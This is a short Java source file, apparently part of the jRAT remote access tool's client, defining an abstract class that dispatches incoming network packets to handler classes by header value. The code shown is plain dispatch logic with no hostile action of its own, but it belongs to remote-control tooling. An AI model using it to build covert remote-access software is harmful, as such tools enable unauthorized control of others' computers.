package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Logger;

import java.util.Set;


public abstract class AbstractIncomingPacket {


	public static final void execute(Connection con, short header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Short> set = IncomingPackets.PACKETS_INCOMING.keySet();
			for (short s : set) {
				if (s == header) {
					packet = IncomingPackets.PACKETS_INCOMING.get(s).newInstance();
					break;
				}
			}
			
            if (packet != null) {
                packet.read(con);
            } else {
                Logger.err("failed to find packet '" + header + "'");
            }
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public abstract void read(Connection con) throws Exception;

}
